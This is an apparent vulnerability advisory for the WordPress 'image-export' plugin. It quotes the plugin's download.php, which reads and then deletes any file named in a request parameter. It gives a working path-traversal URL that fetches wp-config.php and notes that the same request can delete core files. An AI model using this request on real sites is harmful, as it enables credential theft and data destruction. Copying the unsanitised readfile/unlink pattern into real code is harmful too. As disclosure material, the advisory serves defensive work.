@@ -1,0 +1,33 @@
+# Exploit Title: Wordpress image-export LFD
+# Date: 03/21/2016
+# Exploit Author: AMAR^SHG
+# Vendor Homepage: http://www.1efthander.com
+# Software Link:
+http://www.1efthander.com/category/wordpress-plugins/image-export
+# Version: Everything is affected including latest (1.1.0 )
+# Tested on: Windows/Unix on localhost
+
+download.php file code:
+
+<?php
+if ( isset( $_REQUEST['file'] ) && !empty( $_REQUEST['file'] ) ) {
+	$file = $_GET['file'];
+
+	header( 'Content-Type: application/zip' );
+	header( 'Content-Disposition: attachment; filename="' . $file . '"' );
+	readfile( $file );
+	unlink( $file );
+	
+	exit;
+}
+?>
+
+Proof of concept:
+
+Note that because of the unlink, we potentially can destroy the wordpress core.
+
+Simply add the get parameter file:
+
+localhost/wp/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
+
+Found by AMAR^SHG (Shkupi Hackers Group)
